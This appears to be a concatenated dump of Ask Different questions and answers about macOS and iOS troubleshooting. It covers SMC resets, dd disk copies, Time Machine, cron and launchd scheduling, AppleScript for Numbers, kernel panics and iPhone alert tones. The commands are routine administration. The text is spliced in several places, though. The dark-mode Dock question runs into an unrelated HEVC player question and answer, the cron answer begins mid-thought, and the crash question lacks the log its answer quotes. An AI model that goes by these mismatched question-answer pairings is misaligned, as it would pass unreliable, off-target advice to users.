(An external keyboard will not work.)\nThe SMC runs on battery power so the only other way to reset it is by disconnecting or fully draining your battery. You can try this if you feel comfortable with the hardware.\n\nI am more inclined to suspect, however, that resetting the SMC will not ultimately resolve your issue. The advice to \"reset your SMC\" is very excessively given here at Ask Different, and in most situations it is in fact not called for in order to root-cause and resolve a given issue. There are very specific reasons to reset the SMC and most problems do not require it.\nNow, the SMC is heavily involved in power management and sleep sequencing, so there may indeed be a reason for trying a reset in your case. However, I would suggest that you first create a separate question and ask for help on debugging the actual symptom you are experiencing (system sleeping despite your attempt to disable it via pmset disablesleep=1).\nIf you do so, you may find helpful suggestions, such as:\n\n*\n\n*Did you also add sleep=0 to your pmset arguments?\n\n*What does pmset -g log show you around the timestamp of the unexpected sleep?\n\n", "Q: What is exactly Automator's \"web content\" in a quick action process (gear wheel)?

The documentation at https://www.macosxautomation.com/automator/services/index.html is useless about this question.\n\nSorry for the French screenshot.

It can be used by any block that accepts \"web content\" type as input (my 3rd block is an example of that).\n", "Q: Why did this dd copy of an encrypted Time Machine drive to another drive seem to have no effect? On macOS in past years I have been able to use dd to copy an entire hard drive to another hard drive of the same size. When I did this, everything was copied: the partition map, the volumes, everything. The copied-to drive was an exact copy of the original in all details.\nYesterday I tried the same thing in macOS Big Sur. The drive I copied from is encrypted and contains only one volume, which contains Time Machine backups.\nDisk Utility says this about the drive I copied from:\n\n*\n\n*Drive model: “Seagate Desktop Media”\n\n*Drive subtitle: “USB External Physical Disk – GUID Partition Map”\n\n*Drive size: 8 TB\n\n*Volume: “mybackup”, formatted as “CoreStorage Logical Volume”\nDisk Utility lets me decrypt-then-mount the “mybackup” volume.\n\nThe shell command I used to do the copy:\ntime caffeinate sudo gdd if=/dev/rdisk2 of=/dev/rdisk3 bs=1024M status=progress conv=noerror,sync\n\nThat ran for 28 hours.  I assume that if there were errors, gdd would have said something. It did not.\nResult:\nDisk Utility says this about the drive I copied to:\n\n*\n\n*Drive model: “Seagate Backup+ Hub BK Media”\n\n*Drive subtitle: “USB External Physical Disk – GUID Partition Map”\n\n*Drive size: 8 TB\n\n*(no volumes)\n\nWhy no volume?  Is there some metadata that needs to be copied but isn’t accessible in the raw disk contents?\nThere is no other disk that could have been /dev/rdisk3 and the copy did not go to a plain file.\nUPDATE\nLater, after reinstalling the OS on an erased disk, I tried to mount the copy again, and it worked.\n\nA: you can copy TM volumes, using SuperDuper!, it takes a while (days to weeks running 24/7 for ~4tb) but it works.\nI've done this to copy a standard HFS+ TM disk onto a CoreStorage Logical Volume Mac OS Extended (Journaled, Encrypted) disk, and from that disk 2 years later to another journaled encrypted disk.\nYou then need to go through the associatedisk stuff and inheriting the backup etc.\nedit\nHere's Shirt Pocket's documentation for copying a time machine volume with SuperDuper!:\nhttps://www.shirt-pocket.com/forums/showthread.php?t=3565\nNote, you need TM switched off during the copy, then you just have to have both drives mounted, and perform the copy, BUT it takes a loooong time. For example, copying from a WD Red internal SATA 3'5\" to a WD Elements 2'5\" portable over usb2 ~3.5TB of data - 3 weeks 24/7. Copying from that same WD Elements to a different WD Red Plus 3.5\", both on USB2 ~3.5TB, 4 days 24/7, that was using a dedicated mac mini to do the job.\nOnce it's done, add the drive in Time Machine, but don't switch time machine automatic backups on yet.\nYou may need to inherit the backup, and then manually associate each of your drives with the backup, as per the Pondini instructions which you can currently find here:\nhttp://oldtoad.net/pondini.org/TM/B6.html\n\n*\n\n*First, do the Inherit backup step, to link the duplicated backup drive to your current system (blue instructions).\n\n*Then, do the Associate OSX Volume to connect your boot drive to its most recent backup (pink instructions).\n\n*Thirdly, associate your non-bootable data-only volumes with their most recent backups (tan instructions).\n\nOnce that's all done, you can try a manual backup, first run this command in terminal:\nlog stream --style syslog  --predicate 'senderImagePath contains[cd] \"TimeMachine\"' --info\nand leave the terminal window open, it will provide a live commentary on what time machine is doing - watch the sizes of the predicted \"Will Copy\" for each of your backed up drives. What you're looking for is that it's only doing a incremental backup. If it says it's copying an amount that's equivalent to a whole new backup of the data, one of the above steps hasn't taken, so try them again. Or possibly your most recent backup was faulty. You can use tmutil to remove the most recent backup, and then go through the above steps again, to associate the current system and drives to the second-most-recent backup, etc.\n", "Q: Google Drive macOS client can't dowload files inside mounted dmg virtual drive I'm trying to let Google Drive client to sync files inside mounted dmg.\nI've added the folder (mounted dmg) to Google Drive client for backup.\nEverything works fine: upload of new files from my machine, deletion of files on my machine are propagated to online Google Drive and deletion of files from web are propagated to my machine.\nBut when I create a new file from Google Drive Web inside the folder, Google Drive Desktop client can't create file inside the mounted dmg: it always return 'not enough disk space' .. my free space is more than 200Gbyte and the issue happen with 2 files of 100KB each.\nThe dmg file was created for read and write, I can create files inside dmg on my machine but it seems Google Drive can't ...\nHas anyone experienced same problem ?\nThank You\n\nA: Finally found the issue: Google Desktop Client can't sync correctly with a small (100MB) mounted dmg virtual drive ... with a 1GB virtual drive everything works correctly.\n", "Q: Repeat key when editing command lines in \"set -o vi\" mode I have set the default shell to bash and have\nset -o vi\nalias vi=vim\n\nset in the ~/.bash_profile.

It does however work when in vi itself.\nHow can this be fixed in set -o vi mode?\n\nA: To have full use of repeating characters, disable Apple's press-and-hold support as detailed here: https://apple.stackexchange.com/a/332770/55242\nMost likely it works in vim because vim changes the terminal mode, while bash does not.\n", "Q: How to use dark mode dock with light mode system I am using Light appearence on mac OS Big Sur.\nWe can set specific applications light/dark mode with this terminal code.\nFor example\ndefaults write com.google.Chrome NSRequiresAquaSystemAppearance -bool yes\nIt makes Google Chrome light mode with dark system theme.

Do you have any suggestions for a video player that would work fine with the imported videos from my iPad?\nThanks.\n\nA: Windows doesn't support HEVC natively - you need an extension - https://www.microsoft.com/en-us/p/hevc-video-extensions/9nmzlz57r3t7?activetab=pivot:overviewtab\nVLC will play them without that extension package.\n", "Q: Run Shell Scripts on a Schedule Is there \"a right\" way to run shell scripts on a schedule in modern versions of MacOS?  My usual go to for this has been using the cron command -- but recent changes make seem like this isn't in the front of Apple's mind these days.\nIs there a better option than cron for running programs on a schedule in modern (Big Sur era) MacOS?  Is my only option biting the bullet and learning how launchd works or is there something simpler/easier that I can use?\n\nA: If there is a “right” way from Apple’s point of view, then it’s launchd. Not that cron is “wrong” per se but it is not the “preferred” way.\nHowever, as you indicated, launchd can be a pain to work with.\nThere are two good apps to try:\n\n*\n\n*https://www.soma-zone.com/LaunchControl/ ¹\n\n\n*https://www.peterborgapps.com/lingon/\nLingon has been around for a long time and is probably better known, but I switched to LaunchControl a few years ago and much prefer it.\nThe developer also maintains https://launchd.info which is a helpful tutorial website to understand how launchd works.\nLaunchControl also has a built-in tool that can mitigate issues around Full Disk Access, making it easier to deal with macOS' restrictions.\n\nThere is another, simpler option: Keyboard Maestro. Not only does Keyboard Maestro have a feature to run scripts (or macros, etc) at a specific time or recurring every X minutes, but you can also use cron-style syntax if you want.\nGiven that Keyboard Maestro is the best automation tool for the Mac, and I'd probably sacrifice a finger rather than be forced to use a Mac without it, you can guess that I strongly recommend Keyboard Maestro. It has a free trial (for other 2 weeks or 30 days, I'm not sure, but it's definitely a long time) and is actively maintained.\n\n¹ As of this writing, both the LaunchControl website and launchd.info site appear to be down, which I assume is just a temporary glitch. They were working as recently as last night.

You need to make sure that the root user has access to your script though.\nExample entry:\n0 8 * * * /usr/local/bin/myscript.sh >> /tmp/myscript_errors.log 2>&1\n\nList existing crontab entries:\ncrontab -l\n\nWhen cron jobs generate output MacOS creates local mail entries which could show up as You have new mail notifications when you open a new terminal shell. To disable local mail messages add to the top of your crontab the following line:\nMAILTO=\"\"\n\nPS: Depending on the version of your MacOS you might need to allow full disc access to /usr/bin/crontab as described in this answer.\n", "Q: Can a sheet be made active using AppleScript? I'm wanting to activate a particular sheet in Numbers using AppleScript. I know that if a table is on the sheet then it can be activated by doing something like this:\ntell the table 1 of sheet 2 of document \"Document\"\n    set value of cell 1 of column \"A\" to \"x\"\nend tell\n\nbut what if there isn't a table and only a chart? Is there a way to activate a sheet if it only contains a chart?\n\nA: This works for me:\ntell application \"Numbers\" to ¬\n    set active sheet of ¬\n        document 1 to ¬\n        sheet 1 of ¬\n        document 1\n\nObviously, change the value of the elements as appropriate.\nYou can also use this syntax:\ntell application \"Numbers\"\n    tell document 1\n        set active sheet to sheet 1\n    end tell\nend tell\n\nAgain, change the value of the elements as appropriate.\n", "Q: How to uninstall \"Logi Options\" utility software in macOS 11.5 Big Sur? I have given up on trying to use my new Logitech Trackman Marble, as it not recognized by the Logi Options utility software I downloaded from Logitech. With no way to adjust the speed of the pointer, and no way to change behaviors of the buttons, the device is useless.\nSpecificaly, I don’t see a way to revoke the permissions I gave in the Accessibility pane of System Preferences during that install process.  I see no such pane now with a checkbox list of products.\nHow can I uninstall Logi Options?\n\nA: Logitech provides an uninstaller with the original software install.\nYou can find in in Applications > Utilities > Logi Options Uninstaller.\nThis should remove any and all of the Logitech software including the uninstaller itself.\n", "Q: AppleScript conditional statement rules I need a script to run between 9pm and 6am and I'm struggling to understand why this isn't working. I've tried with and without parentheses.\nFrom the suggestions here, I removed \"as string\" but then got an error when I tried to run the app.\nI figured out the error came from another line in the code that I didn't include in the example.\nset myTimeB to (round ((time of date ((current date) as string)) / 60) rounding down) mod 5 = 0 --every 5 minutes\n\nAny idea why this needs \"as string\" to function?\nset myTime to time of (current date) --as string\n\nif (myTime > 21600) and (myTime < 75600) then\n    display notification \"it's between 6am and 9pm\"\nelse\n    display notification \"it's between 9pm and 6am\"\nend if\n\n\nA: Update to address totally changed scope of original question:\nThe issue as I see is that of date and as string in ((time of date ((current date) as string)) / 60) do not belong there. It should just be:\nset myTimeB to (round ((time of (current date)) / 60) rounding down) mod 5 = 0 --every 5 minutes`\n\n\n*\n\n*(time of (current date) returns an integer, so it's all set to be divided by 60. There is no need to be coercing it to a string.\n\n*of date makes no sense in the equation.\n\n\nOriginal answer:\nThe following works for me:\nset myTime to time of (current date)\n\nif (myTime > 21600) and (myTime < 75600) then\n    display notification \"it's between 6am and 9pm\"\nelse\n    display notification \"it's between 9pm and 6am\"\nend if\n\nNote that originally, myTime was a string and you were comparing it against an integer. Now it's being compared against the same class.\nIf you run the following in Script Editor:\nreturn class of time of (current date) & class of 21600\n\nIt returns: {integer, integer}\nWhile the result of:\nset myTime to time of (current date) as string\nreturn (class of myTime) & class of 21600\n\nIt returns: {text, integer}\n", "Q: Unidentifiable Bluetooth device on macOS I have a always reappearing bluetooth device on my iMac (macOS 11.5.2). It just shows as a MAC address and is not connected. This is the System Report output.\nf3-8f-f4-57-45-c2:\n  Address:  F3-8F-F4-57-45-C2\n  Major Type:   Miscellaneous\n  Minor Type:   Unknown\n  Services: \n  Paired:   Yes\n  Configured:   Yes\n  Connected:    No\n  Bluetooth Core Spec:  1.0b\n  Class of Device:  0x00 0x00 0x0000\n\nI already tried to remove the device, reset all connected Apple devices and reset the Bluetooth module. Nothing worked, the device always shows up after a few minutes.\nI don't see this device on any other Apple device like my MacBook and iPad. So I don't think, it is not something iCloud or HomeKit related.\nHow can I identify what this device is and how can I remove it?\n\nA: How much human-parseable information a Bluetooth device broadcasts is entirely up to the device's implementors, so there is no guarantee that you'll be able to find an easy answer. However, there are a couple of things you can do to heuristically make a guess.\n\n*\n\n*First, if the transmitter is a standalone device, you can try to find its approximate physical location in your room by running a realtime RSSI display tool (e.g., Bluetooth Inspector) and playing \"warmer / colder\" with your iMac: When RSSI goes up (becomes less negative) you know you're getting closer, and when it goes down (negative value increases) you are farther away. You will need a long extension cord and good upper arm strength to do this effectively.\n\n*You can use Apple's PacketLogger, part of their\nAdditional Tools for Xcode package at the Apple Developer downloads page, to filter for data packets coming from the MAC address you mentioned and inspect them. It is more than likely that the packets won't contain plaintext ASCII and so will probably not directly give away what this device is, but the combination of packet timing/intervals, packet length, data variance between packets, and other metadata might start giving you some clues on what this thing is. Truly trying this is going to require at least hour of patience and data manipulation.\n\n", "Q: macOS crashes on any sound My M1 Mac has started facing strange problems since yesterday. It would crash every 2-3 mins into login with a pink screen.

Any ideas on what might be causing this?\nEdit: Reinstalled the OS, still facing the issue. Mostly a hardware issue. This happened very abruptly last night, not sure what changed.\n\nA: \npanic(cpu 0 caller 0xfffffe002899ea44): \"i2c1::_checkBusStatus SCL is stuck low; last write status 00010108 int shadow 00010100 xfer 00000000 fifo 00000000 for device audio-tas5770L-spkr-left-rear\"\n\nThis indicates that the I2C interface between the CPU and the built-in TAS5770L audio amplifier is unresponsive. This matches up exactly with your observation that the panic is happening only when audio is supposed to be played.\nGiven that this is a new machine, safe mode and reinstall don't help, and the loaded drivers suggest that you don't appear to have external peripherals attached, I have to say that the evidence points strongly to this being an Apple bug. Without additional debugging (which requires tools and source code that we don't have), we can't even determine whether the root cause is in hardware or in software.\nThis means that you are unlikely to be able to fix this yourself. Your best bet is to report the bug and then to contact Apple Support.\n\n[Something that you can do in the mean time to gather a little bit more information is to symbolicate your crash report. While this won't do anything to fix or root-cause your problem, and is unnecessary for reporting the bug to Apple (as they have tools to symbolicate any crash report ex post facto), it would be an interesting exercise for anyone who wants to understand a little bit more about the failure path. Here are steps for enabling symbolication:]\n\n*\n\n*Run the following Terminal command: sudo nvram boot-args=\"keepsyms=1\". Make sure to copy-paste this so that you're entering straight quotes rather than curly/“smart” quotes. (If you get a permission error, you will first need to disable System Integrity Protection. You can re-enable it after you're done with this investigation.)\n\n*Reboot your machine. The next time this crash happens, your report will have a symbolicated backtrace.\n\n", "Q: How to connect 2nd monitor to iMac 2020 without usb-c? My iMac 2020 reboots when 2nd monitor is connected via USB-c. I've been through apple support so many times! I gave my iMac to Apple Genius etc. Nobody at Apple is willing to admit that iMac has a malfunction. I've been struggling with it for over 8 months and I know for a fact that it reboots only when I connect any 2nd monitor! Apple thinks I should go to the monitor's manufacturer or to Adobe (since I use Photoshop). I know that this monitor works great with other computers and it's not the only monitor I tried with my iMac. But only my iMac reboots. So support essentially is useless for me and I have to deal with it by myself.\nSo I wonder is there any other way I can use a second monitor apart from connecting it via USB-c? Is it possible to use a Bluetooth dongle to my second monitor? Are there any other ways?\nHere is one of the crash logs:\npanic(cpu 1 caller 0xfffffff023abfa08): x86 CPU CATERR detected\nDebugger message: panic\nMemory ID: 0x6\nOS release type: User\nOS version: 18P4663\nmacOS version: 20F71\nKernel version: Darwin Kernel Version 20.5.0: Fri May  7 22:04:14 PDT 2021; root:xnu-7195.121.3~8/RELEASE_ARM64_T8010\nKernel UUID: 7A04D40F-4E77-350D-B90A-DBD2A19DB08D\niBoot version: iBoot-6723.120.36\nsecure boot?: YES\nx86 EFI Boot State: 0xe\nx86 System State: 0x0\nx86 Power State: 0x0\nx86 Shutdown Cause: 0x1\nx86 Previous Power Transitions: 0x20002000200\nPCIeUp link state: 0x94721614\nPaniclog version: 13\nKernel slide:      0x000000001bbb4000\nKernel text base:  0xfffffff022bb8000\nmach_absolute_time: 0x2cbaf4d2c7c\nEpoch Time:        sec       usec\n  Boot    : 0x60c31b28 0x0002c451\n  Sleep   : 0x60c7a3e2 0x00085b10\n  Wake    : 0x60c7a41b 0x000479aa\n  Calendar: 0x60c7cbe6 0x000caebf\n\nPanicked task 0xffffffe199ffc630: 2882 pages, 189 threads: pid 0: kernel_task\nPanicked thread: 0xffffffe19a0f2c00, backtrace: 0xffffffe804713700, tid: 365\n          lr: 0xfffffff0232b349c  fp: 0xffffffe804713750\n          lr: 0xfffffff0232b32f4  fp: 0xffffffe8047137c0\n          lr: 0xfffffff0233dedf0  fp: 0xffffffe804713890\n          lr: 0xfffffff0238d95fc  fp: 0xffffffe8047138a0\n          lr: 0xfffffff0232b3028  fp: 0xffffffe804713c20\n          lr: 0xfffffff0232b3028  fp: 0xffffffe804713c80\n          lr: 0xfffffff02421b200  fp: 0xffffffe804713ca0\n          lr: 0xfffffff023abfa08  fp: 0xffffffe804713cd0\n          lr: 0xfffffff023aadd98  fp: 0xffffffe804713d30\n          lr: 0xfffffff023aafc94  fp: 0xffffffe804713dc0\n          lr: 0xfffffff023aad43c  fp: 0xffffffe804713e50\n          lr: 0xfffffff0239b20fc  fp: 0xffffffe804713e80\n          lr: 0xfffffff02382e010  fp: 0xffffffe804713ec0\n          lr: 0xfffffff02382d890  fp: 0xffffffe804713f00\n          lr: 0xfffffff0238e45a0  fp: 0x0000000000000000\n\n\nA: I’m not sure about why your monitor is giving issues, but I know that a displaylink usb-a to hdmi or DP adapter, something like this:\nhttps://www.amazon.com/Adapter-Multi-Display-Converter-Desktop-Projector/dp/B089KM3P5T/\nThe one-star reviews seem to revolve around the fact that the driver is hard-to-find. It MOST LIKELY (99%) uses displaylink, and in fact (off-topic), allows m1 macs to have more than 2 displays. Use the generic displaylink driver from https://www.displaylink.com/downloads/macos and you should be good to go.\n\nA: Without knowing more about the monitor it's difficult (for me at least) to offer a resolution.  I believe you need to do some more investigation into the cause and see what can be done to avoid the cause.\nI have not seen a display with only a USB-C input except portable displays that use DisplayLink or some other USB GPU.  If the display has a USB GPU then look to a driver issue as the cause of the crash.\nIf you have some other port on the display to connect to the computer then try that.  It is possible there is some hardware issue in the display, cable, or computer that is causing this crash and if you workaround this issue you can keep using the display without crashing.  As an example if your display has a DisplayPort input then find a USB-C to DisplayPort cable to connect the computer to the display.  These cables aren't free, and I suspect you don't want to spend a lot of money on resolving this, but they aren't exactly expensive either.  If a different cable resolves the issue then the problem is solved even if you don't know for sure what the problem was in the first place.\nA USB-C to DisplayPort (or whatever port) cable would break many connections between the computer and display, any of which could be the source of your problem.  If all you care about is the video signal to the display then there should be no issue in breaking these non-video connections.  If you do care about these connections then that gets back to doing more investigation to the cause.  A temporary breaking of the non-video connections with an adapter cable will at least prove to you if the source of the problem is in the video signal or some other signal the USB-C cable carries.\nI don't know if I've been helpful, I only hope I was helpful.  Good luck.\n\nA: So Your iMac has Thunderbolt Ports (type C) and I'm assuming your Monitor has a USB Type-C input.\nOption 1 -\nIf your monitor has other input types such as HDMI, DisplayPort (DP), DVI or VGA then you need to get an Adapter from ThunderBolt/USB-C to HDMI/DP/DVI/VGA. You pretty much have a wide variety of options when it comes to this, just search Thunderbolt Dock on amazon and you will find what you need.\nOption 2 - Airplay. You can use an old computer or Raspberry Pi to act as an airplay server. I use an app called UxPlay on an old computer running Linux then I can wirelessly connect my MacBook to the screen.\nOption 3 - Maybe it's a software bug, have you tried doing a clean install of MacOS? Have you tried using Bootcamp to install Windows and see if the issues persists on Windows?\nHowever I would recommend you send it back for replacement if Option 1 doesn't work because it means your iMac is faulty. When you do take it back ask them to try and connect an external display and see what happens.\nNB!!! Make sure you test option one with other Monitors as well before you send it back because it might just be an issue with that particular monitor.\n", "Q: In an Ubuntu VM setup through vftool on M1 Mac, the arrow keys and ⌘+V keys are not working I have setup an Ubuntu VM on and M1 Mac using vftool.

I think the answer to this question is \"no\", as I've not found any mention of it in the Numbers dictionary, but I thought I would ask here in case it's an undocumented feature.\nI have a fairly large Table that I'm using AppleScript on. I'm running a script like this on it and have noticed it's very slow when the zoom level is low. When I set it to 400% it runs 100x faster.\nrepeat with i from 2 to the count of cells of column \"E\"\n    set the value of cell i of column \"E\" to (the value of cell i of column \"C\")\nend repeat\n\nSo is there a way to automated this in AppleScript so that before I enter that repeat loop I can set zoom to 400%?\nI would like to add that I can't use System Events in this case as I need it to happen in the background.\n\nA: The following example AppleScript code uses UI Scripting, however as tested it did not require Numbers to be frontmost.  In other words it will work in the background, albeit I did see the Zoom menu pop up briefly but the window stayed in the background.\nExample AppleScript code:\n--  # Assumes Numbers spreadsheet is already opened.   \n\nmy zoomToPercent(\"400%\")\n\non zoomToPercent(p)\n    tell application \"System Events\"\n        tell group 2 of ¬\n            toolbar 1 of ¬\n            window 1 of ¬\n            application process \"Numbers\"\n            \n            set percentButton to ¬\n                the first menu button ¬\n                    whose name contains \"%\"\n            \n            click percentButton\n            click menu item p of menu 1\n            \n        end tell\n    end tell\nend zoomToPercent\n\nNotes:\nSet it up as a handler so you can pass it a new value after the processing at the higher percent.\nYou can change window 1 to e.g. window \"Untitled\" or whatever the name of the window is.\nThe handler also could be modified to take a second parameter, being the name of the window.\nNote: The Zoom menu on the Toolbar and the value passed must be one that shows on the Zoom menu on the Toolbar.\nUI Scripting can be kludgy and is prone to failure. It can easily break as the UI changes in different version of the product, or change the user can make, timing issues, etc.\nThe example AppleScript code, shown above, was tested in Script Editor with Numbers version 10.2 (7028.0.88) under macOS Catalina with Language & Region settings in System Preferences set to English (US) — Primary and worked for me without issue1.\n\n*\n\n*1  Assumes necessary and appropriate settings in System Preferences > Security & Privacy > Privacy have been set/addressed as needed.\n\nModified handler to take the percentage and the name of window:\n--  # Assumes Numbers spreadsheet is already opened.   \n\nmy zoomToPercent(\"400%\", \"Untitled\")\n\non zoomToPercent(p, n)\n    tell application \"System Events\"\n        tell group 2 of ¬\n            toolbar 1 of ¬\n            window n of ¬\n            application process \"Numbers\"\n            \n            set percentButton to ¬\n                the first menu button ¬\n                    whose name contains \"%\"\n            \n            click percentButton\n            click menu item p of menu 1\n            \n        end tell\n    end tell\nend zoomToPercent\n\n\n\nNote: The example AppleScript code is just that and sans any included error handling does not contain any additional error handling as may be appropriate. The onus is upon the user to add any error handling as may be appropriate, needed or wanted. Have a look at the try statement and error statement in the AppleScript Language Guide. See also, Working with Errors. Additionally, the use of the delay command may be necessary between events where appropriate, e.g. delay 0.5, with the value of the delay set appropriately.\n", "Q: backlit keyboard turns ON after shutdown or in sleep in MacBook Air M1 My 10 days old MacBook Air M1 laptop is behaving abnormally i.e it's Keyboard Backlit light turns ON after I Shutdown my laptop or put it on sleep. The light starts flashing or becomes still. And when I turn MacBook On it becomes normal just like before.\nCurrently it is running on BigSur 11.5.2\nI have also went to system preferences.\nI have tried Diagnostics test but no issue was found.\n\nA: It may be an electronic malfunction and probably nothing you can fix yourself. I'd call Apple and ask them what you should do. I'm sure they will either fix it or send you a new one.\n\nA: Do you live in a very humid area? or had any water spill on your keyboard? I also have the exact same issue on my few weeks old M1 MacBook Air and I was suspecting humidity to be the cause! Anyway, I guess the Service Center will be able to give a better diagnosis in both of our cases.\n", "Q: zsh: how do I get ctrl-p and ctrl-n keys to perform history-search-backward/forward like in bash? In zsh, I can search my history based on what has been typed on the command line so far with:\n    bindkey \"\\e[A\" history-search-backward\n    bindkey \"\\e[B\" history-search-forward\n\nSo if I type in:\nln -s som\nand hit the up arrow, it will show me the most recent command that begins with ln -s som.\nIn bash, I used the ctrl-p and ctrl-n to do the same thing to make it more convenient to type:\n    bindkey \"\\C-p\" history-search-backward\n    bindkey \"\\C-n\" history-search-forward\n\nHowever, when I try binding C-p and C-n to the history search in zsh, the results are based on the first word in the command. So if I type in:\nln -s som\nand then hit C-p, it will show all previous results that start with ln instead of ln -s som\nAnybody know how I can get C-n and C-p to behave like bash in zsh?\nUPDATE: I've tried various iterations of key sequence like:\nbindkey \"^p\" ...\nbindkey \"^P\" ...\nbindkey \"^P\" ... (using ^V then ^P) to generate the \"^P\" character\nbindkey \"C-p\" ...\nbindkey \"Ctrl-p\" ...\n\nBut none of these make any difference.\n\nA: OK, the widget you need to get the behavior I describe is history-beginning-search-backward\nSo this works now:\n   bindkey '^P' history-beginning-search-backward\n   bindkey '^N' history-beginning-search-forward\n\n", "Q: Can I use iCloud for offline archive? I want to take about 50 Gb of files off my computer but have them stored in iCloud. (I will also keep a local offline hard drive archive of the same files – the iCloud piece is to give me an additional copy offsite in case of disaster like my house burning down.)\nTry as I might, iCloud's basic functional model and the meanings of the host of status icons in the iCloud Drive finder windows have eluded me. It's still just not clear how I can designate an iCloud folder to not sync to any local copy on my Mac like the local iCloud Drive folder.\nI will also want to continue to use iCloud's synch services to maintain local and cloud copies of other files such as those created in select applications and specified in the iCloud settings panel. So, a separate use case from my offline archive needs, and one that seems to be iCloud's default so no need for help on that. I just mention it for clarification in case iCloud will do manually manage offline archive OR automatic synching but doesn't provide for both on one Mac.\nAll the info I find on how iCloud works seems to cover the common backup/synch use case, but not the archive use case I also need.\nI would love to find a clear, simple abstract of what iCloud's file handling model itself is, so that I could infer from that whether my offline archive use case is possible. No love on that front, so I'd be happy to find just an explicit description of how to do offline archiving instead.\n\nA: iCloud Drive is not intended for your use case of archiving specific files that you do not want on your local drive. Note also that iCloud Drive is not a backup solution at all. For backup purposes I would strongly suggest using an actual backup service or \"raw\" cloud storage (such as S3, B2 or similar).\nYou can open System Preferences > Apple ID > iCloud and enable Optimize Mac Storage, which will remove files from your local drive, while keeping them in iCloud Drive, when you run out of disk space. However, you cannot decide when, which files or anything like that.\nFor cloud archival storage, I would look at services such as S3, B2 and the like (depending on the size of your archives). For long-term storage where you will not need frequent access to the data, you can get fairly cheap storage with a service such as Amazon S3 Glacier.\nI would recommend using the program rclone to copy files to S3/B2 storage (and in general to download and manage the files afterwards). It seems to always work very reliably, whereas I have found several GUI tools to be a bit wonky in practice.\n\nA: As @jksoegaard has said, iCloud is neither a backup nor an archive service, it is intended for syncing between devices.\nAs an archive you can use one of the other consumer cloud services - but without using their synchronisation apps.  You do not need to use AWS, B2, etc.  To use a consumer cloud service for an archive you can use one or more of:\n\n*\n\n*Web interface to, for example, OneDrive or Google Drive.  This option is free.\n\n\n*An app like Commander One Pro which understands how to present One Drive, Google Drive, Dropbox, etc. in a functional, but very old fashioned DOS-like two pane interface.  Though the app title refers to it being an FTP client, Commander One Pro knows about many cloud services.\n\n\n*Mountain Duck (or similar) which integrates the cloud service into Finder.  It does use some disk space as a cache. There is also a sibling product Cyberduck which you may prefer - it doesn't have a cache or Finder interface.\nI use both Commander One Pro and Mountain Duck. All three of these methods can be used for the same data being stored, though I would avoid using Mountain Duck at the same time as the other two suggestions.\nPlease remember than an archive is not a backup.  You need at least one other copy - either a hard disk or a second cloud service.\n", "Q: Convert multiple .mp3 files (or single .m4a) into .m4b with ffmpeg and afconvert on macOS I'm using macOS and have a set of .mp3 files that represent the chapters of an audiobook. I want to combine them into a single .m4b file.\nHow can I do this from command line without significantly increasing file size?\n\nA: EDIT: Whelp, looks like m4b-tool is a great CLI tool for just this. I'm going to be switching over to use their solution instead of my custom ffmpeg/afconvert.

I have a very simple question about custom alert tones on iPhones, which there doesn't seem to be any good Google hits for:\nIs there any possible way whatsoever to install your own custom \"alert tone\" / notification signals (not ringtones!) on an iPhone?\nAnd when I say \"your own custom\", I do not mean purchasing alert tones from the Apple store, but rather, importing them from whatever audio you have in your iTunes library, or somewhere else.\nThere are a lot of apps for making custom ringtones (including Garageband), but none of them seem to be able to save these as \"alert tones\" (notification tones) in iOS, but rather just ringtones.\nThe problem with this is that most other apps that allow you to customize their notification sounds (e.g. Signal, Telegram, WhatsApp etc), only allow you to choose from the \"alert tones\" list in iOS, rather than the \"ringtones\" list, which makes this distinction critical indeed.\nThere a lots and lots of tutorials and apps online that claim to be able to install custom alert tones / notification tones, but every single one that I have found end up installing a custom \"ringtone\" after all. :-(\nIf the answer to my question is \"no\", an extra bonus question would be: Why on earth would Apple lock down such a feature?\n\nA: You can do this, but Apple has made it difficult.\nMethod one requires that you install iTunes on a Windows computer. (I presume that there's a way to do this with an Apple computer as well, but it would probably be different because iTunes no longer exists as a discrete application for MacOS.) See https://www.howtogeek.com/248489/how-to-add-custom-ringtones-to-your-iphone/\nMethod two requires that you install GarageBand on your iPhone. You can either create a ringtone in GarageBand, or import an audio clip from the Files app, and then use the Share function to export it as a ringtonge. See https://www.makeuseof.com/how-to-make-ringtone-garageband/\n\nA: This is in response to mc510's answer\nEvery single YouTube video I have seen is exactly the same......it ends up creating a \"ringtone\" never ever EVER an \"alert tone\"\nWhen selecting tones for things like Telegram the only options it gives you the default \"alert tones\" (and I think possibly tones you download through that tone store option) but it won't list ANY ring tones, whether your own creation or not\nThe OP is asking how to create a \"alert tone\" they are quite different and I concur with his frustration\n\nA: i'm very surprised as well, nobody seems to notice this was possible on Android but not on iOS, for YEARS!\nOk i will add a detail that will blow your mind even more...\nOn the Signal app on iOS, is possible to set your own custom notification sound, different for every single contact. Apparently Whatsapp and Telegram developers have no excuses\n", "Q: How can I browse or search any alert tones (notification sounds, contrary to ringtones) in the official store other than those ~50 displayed up front? When I open the \"ringtone store\" directly from inside the iPhone settings for ringtones, there is a special section available for alert tones, rather than ringtones (which will end up in the \"alert tone\" list in iOS if you purchase them, rather than in the ringtone list where ringtones will end up).\nBut there are only around 50 such alert sounds listed there (and most are soundbits from contemporary movies and similar, rather than your classical alert and notification sounds), and I cannot for the life of me find any way to expand this list? To make things even worse, when using the search feature in this store, the results never contain any alert tones at all, only ringtones?!\nFor a company that has seemingly locked down any possibility for users to add their own custom alert tones (or haven't they?), this seems even more crazy, so I'd be super happy if someone would tell me that I'm just blind and/or stupid, and that there is after all an easy way to both browse and search for lots of more alert tones in Apple's \"tone store\"?\n\nA: Yes, there are more, available. You can search, and if there are any alert tones matching the search, a tab will pop up in the top (it may be hidden under 'More', and the positions seems to vary search to search annoyingly).\nExample search:\n\nIf it doesn't show the tab (even under more) then there aren't any for that search (and alas, many of the alert tones that do exist are soundbits, but hopefully you can find something good)\nNote: I don't own an iPhone, so if the settings doesn't just open the iTunes store app, try that, because thats what it does on iPad.\n", "Q: Reminders: prevent app quit on CMD+W I'm used to closing only the open windows when pressing CMD+W. However, when all Reminders windows are closed, the application itself quits.\nHow to prevent this behavior?\n\nA: This is a long-standing fundamental behaviour in MacOS. From the 2008 Human Interface Guidelines (Chapter 14):\n\nIn most cases, applications that are not document-based should quit\nwhen the main window is closed. For Example, System Preferences quits\nif the user closes the window. If an application continues to perform\nsome function when the main window is closed, however, it may be\nappropriate to leave it running when the main window is closed.\n\n(However, Apple has been ignoring its own guidelines over recent years and changing them to incorporate touch-screen interface design. Notes does not quit on close, and I can't see any residual function.)\nThere is no way of changing the design of these apps.\nGiven the speed with which these apps load, and their small memory footprint, I'd 